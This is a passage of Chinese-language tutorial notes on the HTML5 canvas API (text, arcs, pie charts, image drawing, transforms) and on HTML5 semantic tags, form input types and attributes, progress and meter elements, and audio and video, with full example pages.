   maxWidth 设置文本最大宽度，可选参数
4.ctx.textAlign文本水平对齐方式，相对绘制坐标来说的
   left
   center
   right
   start 默认
   end
   direction属性css(rtl ltr) start和end于此相关
        如果是ltr,start和left表现一致
        如果是rtl,start和right表现一致
5.ctx.textBaseline 设置基线（垂直对齐方式  ）
    top 文本的基线处于文本的正上方，并且有一段距离
    middle 文本的基线处于文本的正中间
    bottom 文本的基线处于文本的证下方，并且有一段距离
    hanging 文本的基线处于文本的正上方，并且和文本粘合
    alphabetic 默认值，基线处于文本的下方，并且穿过文字
    ideographic 和bottom相似，但是不一样
6.measureText() 获取文本宽度obj.width
```


![](https://box.kancloud.cn/caab89ed5b3665be01f66efa47625ece_449x309.png)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
            display: block;
            margin: 100px auto;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*1.在画布的中心绘制一段文字*/
    /*2.申明一段文字*/
    var str = '您好中国';
    /*3.确定画布的中心*/
    var w = ctx.canvas.width;
    var h = ctx.canvas.height;
    /*4.画一个十字架在画布的中心*/
    ctx.beginPath();
    ctx.moveTo(0, h / 2 - 0.5);
    ctx.lineTo(w, h / 2 - 0.5);
    ctx.moveTo(w / 2 - 0.5, 0);
    ctx.lineTo(w / 2 - 0.5, h);
    ctx.strokeStyle = '#eee';
    ctx.stroke();
    /*5.绘制文本*/
    ctx.beginPath();
    ctx.strokeStyle = '#000';
    var x0 = w/2;
    var y0 = h/2;
    /*注意：起点位置在文字的左下角*/
    /*有文本的属性  尺寸 字体  左右对齐方式  垂直对齐的方式*/
    ctx.font = '40px Microsoft YaHei';
    /*左右对齐方式 (center left right start end) 基准起始坐标*/
    ctx.textAlign = 'center';
    /*垂直对齐的方式 基线 baseline(top,bottom,middle) 基准起始坐标*/
    ctx.textBaseline = 'middle';
    //ctx.direction = 'rtl';
    //ctx.strokeText(str,x0,y0);
    ctx.fillText(str,x0,y0);
    /*6.画一个下划线和文字一样长*/
    ctx.beginPath();
    /*获取文本的宽度*/
    console.log(ctx.measureText(str));
    var width = ctx.measureText(str).width;
    ctx.moveTo(x0-width/2,y0 + 20);
    ctx.lineTo(x0+width/2,y0 + 20);
    ctx.stroke();

</script>
</body>
</html>
```
>[success] # 绘制圆弧
![](https://box.kancloud.cn/55f03ffe0f25f78101e070c1243c6ccf_468x406.png)
```
1.圆360° 也就是2π 弧度长
2.从右面为起点顺时针转动结尾是2π
3.绘制一个弧需要
    确定圆心  坐标 --- x y
    确定圆半径 --- r 
    确定起始绘制的位置和结束绘制的位置  确定弧的长度和位置  startAngle endAngle   弧度
    取得绘制的方向 direction 默认是顺时针 false 逆时针 true 
```
>[danger] #####  绘制一个弧
```
1.半径长度为150，逆时针的圆
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*绘制圆弧*/
    /*确定圆心  坐标 x y*/
    /*确定圆半径  r */
    /*确定起始绘制的位置和结束绘制的位置  确定弧的长度和位置  startAngle endAngle   弧度*/
    /*取得绘制的方向 direction 默认是顺时针 false 逆时针 true */

    /*在中心位置画一个半径150px的圆弧左下角*/
    var w = ctx.canvas.width;
    var h = ctx.canvas.height;
    ctx.arc(w/2,h/2,150,Math.PI/2,Math.PI,true);
    ctx.stroke();


</script>
</body>
</html>
```
>[danger] ##### 绘制一个圆弧
```
1.为了能让圆弧闭合 ctx.moveTo(w/2,h/2); 从圆心位置开始
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*在中心位置画一个半径150px的圆弧右上角 扇形  边  填充 */
    var w = ctx.canvas.width;
    var h = ctx.canvas.height;

    /*把起点放到圆心位置*/
    ctx.moveTo(w/2,h/2);

    ctx.arc(w/2,h/2,150,0,-Math.PI/2,true);

    /*闭合路径*/
    //ctx.closePath();

    ctx.fill();


</script>
</body>
</html>
```
>[success] # 圆弧分割6等分
```
1. 要画多个扇形弧度  定义个数 定义可以分成多少个弧度
2. 画弧度通过循环实现，开始的边等i* 平均的弧度，结束i* 平均弧度+1
```
>[danger] ##### 代码
![](https://box.kancloud.cn/876489d6da0fe974234f9c1da5bab4a0_542x377.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    var w = ctx.canvas.width;
    var h = ctx.canvas.height;

    /*分成几等分*/
    var num = 6;
    /*一份多少弧度*/
    var angle = Math.PI * 2 / num;

    /*原点坐标*/
    var x0 = w / 2;
    var y0 = h / 2;

    /*获取随机颜色*/
    var getRandomColor = function () {
        var r = Math.floor(Math.random() * 256);
        var g = Math.floor(Math.random() * 256);
        var b = Math.floor(Math.random() * 256);
        return 'rgb(' + r + ',' + g + ',' + b + ')';
    }

    /*上一次绘制的结束弧度等于当前次的起始弧度*/
    //var startAngle = 0;
    for (var i = 0; i < num; i++) {
        var startAngle = i * angle;
        var endAngle = (i + 1) * angle;
        ctx.beginPath();
        ctx.moveTo(x0, y0);
        ctx.arc(x0, y0, 150, startAngle, endAngle);
        /*随机颜色*/
        ctx.fillStyle = getRandomColor();
        ctx.fill();
    }


</script>
</body>
</html>
```
>[success] # 计算年龄占比
![](https://box.kancloud.cn/10af48c3dcad195608efcfdc35cbb712_475x386.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*1.绘制年龄占比*/
    /*2.准备统计的数据*/
    /*15-20岁 6个*/
    /*20-25岁 30个*/
    /*25-30岁 10个*/
    /*30-35岁 8个*/
    var data = [6, 30, 10, 8];
    /*3.在饼图表示出来*/
    /*4.需要把数据转出弧度*/
    var angleList = [];
    var total = 0;
    // 求出总共多少
    data.forEach(function (item, i) {
        total += item;
    });
    console.log(total);
    /*第二是转换成弧度的时候就可以去绘制扇形 减少一次遍历*/
    data.forEach(function (item, i) {
        // 算出弧度大小
        var angle = Math.PI * 2 * (item/total);
        angleList.push(angle);
    });
    console.log(angleList);
    /*5.根据弧度绘制扇形*/

    var w = ctx.canvas.width;
    var h = ctx.canvas.height;
    var x0 = w/2;
    var y0 = h/2;
    /*获取随机颜色*/
    var getRandomColor = function () {
        var r = Math.floor(Math.random() * 256);
        var g = Math.floor(Math.random() * 256);
        var b = Math.floor(Math.random() * 256);
        return 'rgb(' + r + ',' + g + ',' + b + ')';
    }


    var startAngle = 0;
    angleList.forEach(function (item,i) {
        /*上一次绘制的结束弧度等于当前次的起始弧度*/
        var endAngle = startAngle + item;
        ctx.beginPath();
        ctx.moveTo(x0,y0);
        ctx.arc(x0,y0,150,startAngle,endAngle);
        ctx.fillStyle = getRandomColor();
        ctx.fill();
        /*记录当前的结束位置作为下一次的起始位置*/
        startAngle = endAngle;
    });

</script>
</body>
</html>
```
>[success] # 做一个完整饼状图
![](https://box.kancloud.cn/2d12280f9e79cd35ca176327bd62141a_679x419.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
            display: block;
            margin: 100px auto;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    /*var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');*/

    /*1.绘制饼状态图*/
    /*1.1 根据数据绘制一个饼图*/
    /*1.2 绘制标题 从扇形的弧中心伸出一条线在画一条横线在横线的上面写上文字标题*/
    /*1.3 在画布的左上角 绘制说明 一个和扇形一样颜色的矩形 旁边就是文字说明*/

    var PieChart = function (ctx) {
        /*绘制工具*/
        this.ctx = ctx || document.querySelector('canvas').getContext('2d');
        /*绘制饼图的中心*/
        this.w = this.ctx.canvas.width;
        this.h = this.ctx.canvas.height;
        /*圆心*/
        this.x0 = this.w / 2 + 60;
        this.y0 = this.h / 2;
        /*半径*/
        this.radius = 150;
        /*伸出去的线的长度*/
        this.outLine = 20;
        /*说明的矩形大小*/
        this.rectW = 30;
        this.rectH = 16;
        this.space = 20;
    }
    PieChart.prototype.init = function (data) {
        /*1.准备数据*/
        this.drawPie(data);
    };
    PieChart.prototype.drawPie = function (data) {
        var that = this;
        /*1.转化弧度*/
        var angleList = this.transformAngle(data);
        /*2.绘制饼图*/
        var startAngle = 0;
        angleList.forEach(function (item, i) {
            /*当前的结束弧度要等于下一次的起始弧度*/
            var endAngle = startAngle + item.angle;
            that.ctx.beginPath();
            that.ctx.moveTo(that.x0, that.y0);
            that.ctx.arc(that.x0, that.y0, that.radius, startAngle, endAngle);
            var color = that.ctx.fillStyle = that.getRandomColor();
            that.ctx.fill();
            /*下一次要使用当前的这一次的结束角度*/
            /*绘制标题*/
            that.drawTitle(startAngle, item.angle, color , item.title);
            /*绘制说明*/
            that.drawDesc(i,item.title);
            startAngle = endAngle;
        });
    };
    PieChart.prototype.drawTitle = function (startAngle, angle ,color , title) {
        /*1.确定伸出去的线 通过圆心点 通过伸出去的点  确定这个线*/
        /*2.确定伸出去的点 需要确定伸出去的线的长度*/
        /*3.固定伸出去的线的长度*/
        /*4.计算这个点的坐标*/
        /*5.需要根据角度和斜边的长度*/
        /*5.1 使用弧度  当前扇形的起始弧度 + 对应的弧度的一半 */
        /*5.2 半径+伸出去的长度 */
        /*5.3 outX = x0 + cos(angle) * ( r + outLine)*/
        /*5.3 outY = y0 + sin(angle) * ( r + outLine)*/
        /*斜边*/
        var edge = this.radius + this.outLine;
        /*x轴方向的直角边*/
        var edgeX = Math.cos(startAngle + angle / 2) * edge;
        /*y轴方向的直角边*/
        var edgeY = Math.sin(startAngle + angle / 2) * edge;
        /*计算出去的点坐标*/
        var outX = this.x0 + edgeX;
        var outY = this.y0 + edgeY;
        this.ctx.beginPath();
        this.ctx.moveTo(this.x0, this.y0);
        this.ctx.lineTo(outX, outY);
        this.ctx.strokeStyle = color;
        /*画文字和下划线*/
        /*线的方向怎么判断 伸出去的点在X0的左边 线的方向就是左边*/
        /*线的方向怎么判断 伸出去的点在X0的右边 线的方向就是右边*/
        /*结束的点坐标  和文字大小*/
        this.ctx.font = '14px Microsoft YaHei';
        var textWidth = this.ctx.measureText(title).width ;
        if(outX > this.x0){
            /*右*/
            this.ctx.lineTo(outX + textWidth,outY);
            this.ctx.textAlign = 'left';
        }else{
            /*左*/
            this.ctx.lineTo(outX - textWidth,outY);
            this.ctx.textAlign = 'right';
        }
        this.ctx.stroke();
        this.ctx.textBaseline = 'bottom';
        this.ctx.fillText(title,outX,outY);

    };
    PieChart.prototype.drawDesc = function (index,title) {
        /*绘制说明*/
        /*矩形的大小*/
        /*距离上和左边的间距*/
        /*矩形之间的间距*/
        this.ctx.fillRect(this.space,this.space + index * (this.rectH + 10),this.rectW,this.rectH);
        /*绘制文字*/
        this.ctx.beginPath();
        this.ctx.textAlign = 'left';
        this.ctx.textBaseline = 'top';
        this.ctx.font = '12px Microsoft YaHei';
        this.ctx.fillText(title,this.space + this.rectW + 10 , this.space + index * (this.rectH + 10));
    };
    PieChart.prototype.transformAngle = function (data) {
        /*返回的数据内容包含弧度的*/
        var total = 0;
        data.forEach(function (item, i) {
            total += item.num;
        });
        /*计算弧度 并且追加到当前的对象内容*/
        data.forEach(function (item, i) {
            var angle = item.num / total * Math.PI * 2;
            item.angle = angle;
        });
        return data;
    };
    PieChart.prototype.getRandomColor = function () {
        var r = Math.floor(Math.random() * 256);
        var g = Math.floor(Math.random() * 256);
        var b = Math.floor(Math.random() * 256);
        return 'rgb(' + r + ',' + g + ',' + b + ')';
    };

    var data = [
        {
            title: '15-20岁',
            num: 6
        },
        {
            title: '20-25岁',
            num: 30
        },
        {
            title: '25-30岁',
            num: 10
        },
        {
            title: '30以上',
            num: 8
        }
    ];

    var pieChart = new PieChart();
    pieChart.init(data);

</script>
</body>
</html>
```
>[success] # 图片的绘制
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<!--<img src="image/01.jpg" alt="">-->
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');

    /*1.加载图片到内存即可*/
    /*var img = document.createElement('img');
    img.src = 'image/01.jpg';*/
    /*创建对象*/
    var image = new Image();
    /*绑定加载完成事件*/
    image.onload = function () {
        /*实现图片绘制*/
        console.log(image);
        /*绘制图片的三种方式*/

        /*3参数*/
        /*图片对象*/
        /*绘制在画布上的坐标 x y*/
        //ctx.drawImage(image,100,100);


        /*5个参数*/
        /*图片对象*/
        /*绘制在画布上的坐标 x y*/
        /*是图片的大小  不是裁剪  是缩放*/
        //ctx.drawImage(image,100,100,100,100);


        /*9个参数*/
        /*图片对象*/
        /*图片上定位的坐标  x y */
        /*在图片上截取多大的区域  w h*/
        /*绘制在画布上的坐标 x y*/
        /*是图片的大小  不是裁剪  是缩放*/
        ctx.drawImage(image,400,400,400,400,200,200,100,100);

    };
    /*设置图片路径*/
    image.src = 'image/02.jpg';



    
</script>
</body>
</html>
```
>[success] # 坐标的移动
```
坐标变换
1.平移 移动画布的原点
translate(x,y) 参数表示移动目标点的坐标
2.缩放
scale(x,y) 参数表示宽高的缩放比例
3.旋转
rotate(angle) 参数表示旋转角度
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        canvas {
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
<canvas width="600" height="400"></canvas>
<script>
    var myCanvas = document.querySelector('canvas');
    var ctx = myCanvas.getContext('2d');
    //ctx.translate(100,100);
    //ctx.scale(0.5,1);
    //ctx.rotate(Math.PI/6);
    var startAngle = 0;
    ctx.translate(150,150);
    setInterval(function () {
        startAngle += Math.PI/180;
        ctx.rotate(startAngle);
        ctx.strokeRect(-50,-50,100,100);
    },500);

</script>
</body>
</html>
```
>[success] # html5
```
1.	万维网的核心语言、标准通用标记语言下的一个应用超文本标记语言（HTML）的第五次重大修改
2.	支持Html5的浏览器包括Firefox（火狐浏览器），IE9及其更高版本，Chrome（谷歌浏览器），Safari，Opera等；国内的傲游浏览器（Maxthon），以及基于IE或Chromium（Chrome的工程版或称实验版）所推出的360浏览器、搜狗浏览器、QQ浏览器、猎豹浏览器等国产浏览器同样具备支持HTML5的能力
3.	HTML5的设计目的是为了在移动设备上支持多媒体。新的语法特征被引进以支持这一点，如video、audio和canvas 标记。HTML5还引进了新的功能，可以真正改变用户与文档的交互方式
4.	增加了新特性：语义特性，本地存储特性，设备兼容特性，连接特性，网页多媒体特性，三维、图形及特效特性，性能与集成特性，CSS3特性
5.	相比之前的进步：取消了一些过时的HTML4标记，将内容和展示分离，一些全新的表单输入对象，全新的，更合理的Tag，本地数据库，Canvas 对象，浏览器中的真正程序，Html5取代Flash在移动设备的地位
6.	优点：
    a)	提高可用性和改进用户的友好体验；
    b)	有几个新的标签，这将有助于开发人员定义重要的内容；
    c)	可以给站点带来更多的多媒体元素(视频和音频)；
    d)	可以很好的替代FLASH和Silverlight；
    e)	当涉及到网站的抓取和索引的时候，对于SEO很友好；
    f)	将被大量应用于移动应用程序和游戏；
    g)	可移植性好。
7.	缺点：该标准并未能很好的被Pc端浏览器所支持。因新标签的引入，各浏览器之间将缺少一种统一的数据描述格式，造成用户体验不佳。
8.	未来趋势
    a)	移动优先
    b)	游戏开发者领衔“主演”
```
>[danger] ##### 构建一个网页布局用html4 实现
![](https://box.kancloud.cn/82df7dfc45a5ccac76c817eff122da63_1376x489.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .header{
            width: 100%;
            height: 80px;
            background-color: red;
        }
        .nav{
            width: 100%;
            height: 40px;
            background-color: green;
        }
        .main{
            width: 100%;
            height: 500px;
            background-color: #ccc;
        }
        .main>.right,.main>.left{
            float: left;
        }
        .main > .left{
            width: 80%;
            height: 100%;
            background-color: purple;
        }
        .main > .right{
            width: 20%;
            height: 100%;
            background-color: pink;
        }
        .footer{
            width: 100%;
            height: 80px;
            background-color: skyblue;
        }
    </style>
</head>
<body>
<div class="header">头部</div>
<div class="nav">导航</div>
<div class="main">
    <div class="left"></div>
    <div class="right"></div>
</div>
<div class="footer"></div>
</body>
</html>
```
>[success] # html5 兼容性
```
1.IE9在不支持部分HTML5新标签的浏览器里，会将这些新的标签解析成行内元素(inline)对待，所以我们只需要将其转换成块
元素(block)即可使用，
2.但是在IE9版本以下，并不能正常解析这些新标签，但是却可以识别通过document.createElement('tagName')创建的自定
义标签，于是我们的解决方案就是将HTML5的新标签全部通过document.createElement('tagName')来创建一遍，这样IE低
版本也能正常解析HTML5新标签了。
3.处理方式：在实际开发中我们更多采用的是通过检测IE浏览器的版本来加载三方的一个JS库来解决兼容问题（测试在IE下面的兼容性：ieTester软件的使用）
```
>[danger] ##### ie9 中粗暴的处理方法
```
1.变成块级元素
```
![](https://box.kancloud.cn/6742415736064345afce6f13096adbb9_442x365.png)

>[danger] ##### ie9 往下的笨办法
```
1.生成对应标签
```
![](https://box.kancloud.cn/4ff4853b8cad3083af183262ef49d547_475x209.png)

>[danger] ##### 常用方法引入js包
```
html5shiv.min.js
```
>[success] # 用html5 布局
```
1.下面的标签本质的化是，一个个div标签只不过是，转译成更标准的表达，去w3c 去看有详细的用的
位置的解释，下面新增的标签更多的是增加了语义化，可以直接给标签写css，不用在class使用
```
```
<header> 语义 :定义页面的头部  页眉</header>
<nav>  语义 :定义导航栏 </nav> 
<footer>   定义 页面底部 页脚</footer>
<article> 语义:  定义文章</article>
<section> 语义： 定义区域</section>
<aside> 语义： 定义其所处内容之外的内容 侧边</aside>
```

|    标签|描述    |
| --- | --- |
| header   |  定义了文档的头部区域  |
| nav   |  定义导航连接的  |
| main   |  主体内容  |
| article   |  定义文本内容主要右侧区域  |
| aside   |  定义页面内容之外的内容主要左侧区域东西  |
| footer   |  定义顶部页面下部的  |
![](https://box.kancloud.cn/82df7dfc45a5ccac76c817eff122da63_1376x489.png)

>[danger] ##### html5 布局
```
1.可以直接个标签赋值属性
```
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        header{
            width: 100%;
            height: 100px;
            background-color: red;
        }
        nav{
            width: 100%;
            height: 36px;
            background-color: green;
        }
        main{
            width: 100%;
            height: 500px;
            background-color: #ccc;
        }
        main > article{
            width: 80%;
            height: 100%;
            background-color: purple;
            float: left;
        }
        main > aside{
            width: 20%;
            height: 100%;
            background-color: pink;
            float: right;
        }
        footer{
            width: 100%;
            height: 80px;
            background-color: skyblue;
        }
    </style>
</head>
<body>
<header>头部</header>
<nav>导航</nav>
<main>
    <article>左边</article>
    <aside>右边</aside>
</main>
<footer>底部</footer>
</body>
</html>
```

[TOC]
>[success] # 新引入的type 属性
```
1.必须提交才能出发
2.只支持ie9往上的浏览器
```

| 标签   |描述    |
| --- | --- |
|  email  |  html5 中新增的邮箱-验证  |
|  tel  |  tel它并不是来实现验证。它的本质目的是为了能够在移动端打开数字键盘 |
|url  |  验证只能输入合法的网址：必须包含http://  |
|  number  | 只能输入数字(包含小数点)，不能输入其它的字符，max:最大值，min:最小值，value:默认值  |
|  search  | 以提供更人性化的输入体验多一个删除input框内容按钮  |
|  range  |  范围输入条:范围 max 最大值，min 最小值，value默认值 不填写默认中间 |
|  color  |  color选择颜色 |
|  time  |  时间：时分秒|
|  data  |  日期：年月日 |
|  datetime  |  大多数浏览器不能支持datetime.用于屏幕阅读器- |
|  datetime-local  | 期和时间 |
|  month  |  月份 |
|  week  |  一年中的第几周 |

>[danger] ##### 案例
![](https://box.kancloud.cn/65c6345f8e437f08667cec191f77684e_355x432.png)
``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        header{
            display: block;
            width: 100%;
            height: 100px;
            background-color: red;
        }
    </style>
</head>
<body>
<form action="">
<!--提交触发-->
<!--html4 中的验证,文本和密码-->
文本：<input type="text"> <br>
密码：<input type="password">
<p>分割线</p>
<!--html5 中新增的邮箱-验证-->
邮箱：<input type="email"> <br>
<!--tel它并不是来实现验证。它的本质目的是为了能够在移动端打开数字键盘。意味着数字键盘限制了用户只能输入数字。  如何查看效果：qq发送文件>>手机端使用qq来接收>>使用手机浏览器查看-->
电话：<input type="tel"> <br>
<!--验证只能输入合法的网址：必须包含http://-->
网址：<input type="url"> <br>
<!--number：只能输入数字(包含小数点)，不能输入其它的字符
    max:最大值
    min:最小值
    value:默认值-->
数量：<input type="number" value="60" max="100" min="0"> <br>
    <!--search：可以提供更人性化的输入体验多一个删除input框内容按钮-->
    请输入商品名称：<input type="search"> <br>
    <!--range:范围
        max 最大值
        min 最小值
        value默认值 不填写默认中间
    -->
    范围：<input type="range" max="100" min="0" value="50"> <br>
    颜色：<input type="color"> <br>

    <!--time:时间：时分秒-->
    时间：<input type="time"> <br>
    <!--date：日期：年月日-->
    日期：<input type="date"> <br>
    <!--datetime:大多数浏览器不能支持datetime.用于屏幕阅读器-->
    日期时间：<input type="datetime"><br>
    <!--datetime-local:日期和时间-->
    日期时间：<input type="datetime-local"> <br>
    月份：<input type="month"> <br>
    星期：<input type="week">
    <input type="submit">

</form>
<script src="../js/html5shiv.min.js"></script>

</body>
</html>
```


[TOC]
>[success] # 表单新增的其他元素

| 属性   |用法    |
| --- | --- |
|placeholder    | 提示文本，点击消失离开显示   |
|autofocus    | 自动获取标签的焦点   |
|autocomplete    |1.默认off必须设置on 2.必须有name属性 3.必须提交过 4.再次点击input会出现历史提交记录   |
|required    | 必须输入，如果没有输入则会阻止当前数据提   |
|pattern    | 正则表达式验证   |
|multiple    | 跟file配合可以选择多个文件，跟email 允许输入多个邮箱地址，以逗号分隔  |
|form    | 根据from id绑定from表单 |

>[danger] ##### 案例
![](https://box.kancloud.cn/9751a5b105543e330954df1d006d1027_580x179.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<form action="" id="myForm">
    <!--placeholder：提示文本，提示占位-->
    <!--autofocus:自动获取焦点-->
    <!--autocomplete:自动完成：on:打开  off:关闭
    1.必须成功提交过:提交过才会记录
    2.当前添加autocomplete的元素必须有name属性-->
    <input type="text" name="username" placeholder="请输入用户名" autofocus autocomplete="on">

    <!--required:必须输入，如果没有输入则会阻止当前数据提交-->
    <!--pattern:正则表达式验证-->
    手机号：<input type="tel" name="userPhone" required pattern="^(\+86)?1\d{10}$"> <br>

    <!--multiple：可以选择多个文件-->
    文件：<input type="file" name="photo" multiple> <br>
    <!--email:有默认验证  在email中，multiple允许输入多个邮箱地址，以逗号分隔-->
    邮箱：<input type="email" name="email" multiple><br>



    <input type="submit">

</form>
<!--下面这个表单元素并没有包含在form中：默认情况下面表单元素的数据不会进行提交-->
<!--form:指定表单id,那么在将来指定id号的表单进行数据提交的时候，也会将当前表单元素的数据一起提交-->
地址：<input type="text" name="address" form="myForm">
<script src="../js/html5shiv.min.js"></script>

</body>
</html>
```

>[success] # 不常用系列

>[danger] ##### select 替代
* 传统使用 下列表
```
  <select>
      <option value="1">DL</option>
      <option value="1">SL</option>
  </select>
```
* 使用html5 新特性
```
1.用input 配合本身属性list 和 datalist标签并且datalist的id绑定input的list对应的名字
2.确定对浏览器兼容查例如火狐都不太支持
3.使用效果可以在input 中查找对应的下拉内容
```
![](https://box.kancloud.cn/ffbba6cafa1e68336fa55d964a080e89_300x186.png)
```
    <!--不仅可以选择，还应该可以输入-->
    <!--建立输入框与datalist的关联  list="datalist的id号"-->
    专业：<input type="text" list="subjects"> <br>
    <!--通过datalist创建选择列表-->
    <datalist id="subjects">
        <!--创建选项值：value:具体的值 label:提示信息，辅助值-->
        <!--option可以是单标签也可以是双标签-->
        <option value="英语" label="不会"/>
        <option value="前端与移动开发" label="前景非常好"></option>
        <option value="java" label="使用人数多"></option>
        <option value="javascript" label="做特效"></option>
        <option value="c" label="不知道"></option>
    </datalist>

    网址：<input type="url" list="urls">
    <datalist id="urls">
        <!--如果input输入框的type类型是url,那么value值必须添加http://-->
        <option value="http://www.baidu.com" label="百度"></option>
        <option value="http://www.sohu.com"></option>
        <option value="http://www.163.com"></option>
    </datalist>
```

>[danger] ##### 加密/ 显示
```
加密：<keygen></keygen><br>
<input type="submit">

<!--显示输出信息：只能显示不能修改
1.语义性更强
2.值需要你去设置，不能自动计算-->
<output>总金额：￥100.00</output>
```
>[success] # 两个新增事件
```
1.oninput 内容改变就会改变
2.oninvalid 更改html 页面验证的文本提示
```
>[danger] ##### 案例
```html
用户名：<input type="text" name="userName" id="userName"><br>
<form>
    <input type='email' id="email" required>
    <input type="submit">
</form>
<span id="inputusername"></span>

<script src="../js/html5shiv.min.js"></script>
<script>
    /*1.oninput:监听当前指定元素内容的改变：只要内容改变(添加内容，删除内容)，就会触发这个事件*/
    document.getElementById('userName').oninput = function () {
        document.getElementById('inputusername').innerText = this.value
    }

    /*oninvalid:当验证不通过时触发*/
    document.getElementById("email").oninvalid=function(){
        /*设置默认的提示信息*/
        this.setCustomValidity("请正确填写邮箱");


    }
</script>
```
>[success] # 新增的进度条标签
```
1.progress 普通分割进度条
2.meter最大值最小值显示进度条
```

>[danger] ##### 用法
![](https://box.kancloud.cn/99406750f069b76220a8d8f302791be2_619x33.png)
```html
<!--max:最大值
value:当前进度值-->
<progress max="100" value="50"></progress>

<!--度量器：衡量当前进度值-->
<!--high:规定的较高的值
low:规定的较低的值
max:最大值
min:最小值
value:当前度量值-->
<meter max="100" min="0" high="80" low="40" value="30"></meter>
<meter max="100" min="0" high="80" low="40" value="60"></meter>
<meter max="100" min="0" high="80" low="40" value="80"></meter>
<meter max="100" min="0" high="80" low="40" value="100" name="level"></meter>
</body>
```
>[success] # 综合
```
1.oninput 实时变化事件
```
![](https://box.kancloud.cn/2ad95a237d33a88c4de1a1708ffdf86f_659x786.png)
>[danger] ##### 代码
```
<stytle>
*{
    padding: 0;
    margin: 0;
}
form{
    width: 600px;
    margin:20px auto;
}

form > fieldset{
    padding: 10px;
}

form > fieldset > meter,
form > fieldset > input{
    width: 100%;
    height: 40px;
    line-height: 40px;
    margin:10px 0;
    border: none;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 16px;
    padding-left:5px;
    /*width=内容+padding+border*/
    box-sizing: border-box;
}
form > fieldset > meter{
    padding-left:0px;
}
</stytle>
</head>
<body>
<form action="">
    <fieldset>
        <legend>学生档案</legend>
        <label for="userName">姓名:</label>
        <input type="text" name="userName" id="userName" placeholder="请输入用户名">
        <label for="userPhone">手机号码:</label>
        <input type="tel" name="userPhone" id="userPhone" pattern="^1\d{10}$">
        <label for="email">邮箱地址:</label>
        <input type="email" required name="email" id="email">
        <label for="collage">所属学院:</label>
        <input type="text" name="collage" id="collage" list="cList" placeholder="请选择">
        <datalist id="cList">
            <option value="前端与移动开发学院"></option>
            <option value="java学院"></option>
            <option value="c++学院"></option>
        </datalist>
        <label for="score">入学成绩:</label>
        <input type="number" max="100" min="0" value="0" id="score">
        <label for="level">基础水平:</label>
        <meter id="level" max="100" min="0" low="59" high="90"></meter>
        <label for="inTime">入学日期:</label>
        <input type="date" id="inTime" name="inTime">
        <label for="leaveTime">毕业日期:</label>
        <input type="date" id="leaveTime" name="leaveTime">
        <input type="submit">
    </fieldset>
</form>
<script>
    document.getElementById("score").oninput=function(){
        document.getElementById("level").value=this.value;
    }
</script>
```
>[success] # 音频视频
```
1.<audio> 音频
	src:播放文件的路径
    controls:音频播放器的控制器面板
    autoplay:自动播放
    loop:循环播放
2.<video> 视频
    src:播放文件的路径
    controls:音频播放器的控制器面板
    autoplay:自动播放
    loop:循环播放
    poster:指定视频还没有完全下载完毕，或者用户没有点击播放前显示的封面。 默认显示当前视频文件的第一副图像
    width:视频的宽度
    height:视频的高度
    宽高只能设置一个，不能同时设置，因为不会按照比例缩放
```

>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>

</head>
<body>
<!--audio:音频-->
<!--
src:播放文件的路径
controls:音频播放器的控制器面板
autoplay:自动播放
loop:循环播放-->
<audio src="../mp3/aa.mp3" controls></audio>

<!--video：视频-->
<!--
src:播放文件的路径
controls:音频播放器的控制器面板
autoplay:自动播放
loop:循环播放
poster:指定视频还没有完全下载完毕，或者用户没有点击播放前显示的封面。 默认显示当前视频文件的第一副图像
width:视频的宽度
height:视频的高度
-->
